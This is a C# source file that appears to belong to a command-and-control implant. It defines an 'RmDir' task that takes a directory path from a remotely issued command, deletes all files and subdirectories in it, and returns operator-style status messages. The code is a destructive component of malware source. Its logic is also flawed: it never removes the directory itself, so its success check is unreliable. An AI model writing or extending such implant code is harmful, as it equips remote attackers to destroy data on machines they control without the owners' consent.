using System.IO;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    internal class Rmdir : ImplantCommands
    {
        private string targetDir { get; set; }

        public override string Name => "RmDir";

        public override string Execute(ImplantTask task)
        {
            targetDir = task.Args;

            DirectoryInfo dirData = new DirectoryInfo(targetDir);

            foreach(FileInfo cFile in dirData.GetFiles()) { cFile.Delete(); }
            foreach(DirectoryInfo dir in dirData.GetDirectories()) { dir.Delete(true); }

            if(!(dirData.Exists)) { return $"[*] {targetDir} removed"; }
            return $"[-] Failed to remove {targetDir}";
        }
    }
}